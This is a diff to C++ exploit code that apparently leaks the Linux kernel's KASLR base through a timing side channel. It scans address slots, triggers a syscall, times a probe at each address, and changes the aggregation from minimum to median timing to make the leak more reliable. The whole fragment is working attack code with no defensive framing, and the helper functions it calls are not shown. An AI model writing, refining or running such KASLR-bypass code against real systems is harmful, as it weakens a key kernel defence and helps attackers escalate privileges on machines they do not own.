@@ -202,17 +202,23 @@ uint64_t sidechannel(uint64_t addr) {
 
 std::optional<uint64_t> try_leak_kaslr_base(int samples) {
     size_t slots = (KASLR_END - KASLR_START) / KASLR_SLOT_SIZE;
-    std::vector<uint64_t> timings(slots, std::numeric_limits<uint64_t>::max());
+    std::vector<std::vector<uint64_t>> all_timings(slots);
+    for (auto& t : all_timings) {
+        t.reserve(samples);
+    }
 
     for (int i = 0; i < samples; i++) {
         for (size_t slot = 0; slot < slots; slot++) {
             uint64_t addr = slot_to_addr(slot);
             syscall(104);
             uint64_t timing = sidechannel(addr);
-            if (timing < timings[slot]) {
-                timings[slot] = timing;
-            }
+            all_timings[slot].push_back(timing);
         }
+    }
+
+    std::vector<uint64_t> timings(slots);
+    for (size_t slot = 0; slot < slots; slot++) {
+        timings[slot] = compute_median(all_timings[slot]);
     }
 
     std::optional<size_t> slot = try_find_edge(timings);
